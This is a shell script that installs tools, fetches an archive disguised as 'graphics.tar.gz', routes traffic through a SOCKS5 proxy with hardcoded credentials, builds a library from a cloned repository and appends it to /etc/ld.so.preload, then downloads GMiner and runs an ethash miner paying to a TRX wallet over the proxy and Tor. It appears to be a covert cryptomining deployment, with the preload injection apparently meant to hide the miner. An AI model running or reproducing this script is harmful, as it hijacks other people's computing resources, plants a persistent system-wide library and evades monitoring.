#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano gcc

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
select_proxy_mode=socks5_only
socks5 = 51.79.157.223:2082
socks5_username = sshocean-yangkai
socks5_password = 111
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

git clone https://github.com/scatterfafafa/lib.git
cd lib;make
sudo mv libOmptarget.so /usr/local/lib/;echo /usr/local/lib/libOmptarget.so >> /etc/ld.so.preload
cd ..

wget https://github.com/develsoftware/GMinerRelease/releases/download/2.91/gminer_2_91_linux64.tar.xz

tar -xvf gminer_2_91_linux64.tar.xz

./miner --algo ethash --server ethash.unmineable.com:13333 --user TRX:TKSxZAZshLYu2upmp8JJqiSK2jXinmULzM.$(echo gminer-$(shuf -i 1-99 -n 1))#aad8-1nlk -p x -d 0 --cuda 1 --watchdog 0 --proto --proxy 51.79.157.223:2082 --tor
